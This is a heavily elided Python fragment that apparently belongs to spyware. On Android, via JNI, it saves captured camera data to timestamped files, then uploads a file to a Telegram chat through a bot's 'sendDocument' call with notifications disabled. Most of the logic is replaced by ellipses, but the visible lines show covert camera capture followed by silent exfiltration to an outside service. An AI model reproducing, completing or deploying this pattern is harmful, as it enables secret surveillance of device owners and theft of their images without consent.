        ...
        if JNI:
            ...
            try:
                ...
                if data:
                    ...
                    out = os.path.join(T, f"c_{cam_id}_{int(time.time())}.bin")
        ...
        try:
            ...
            if tg and vl:
                ...
                with open(z, 'rb') as f:
                    ...
                    tg._ap("sendDocument", {"chat_id": vl, "caption": "📸", "disable_notification": True}, {"document": f})
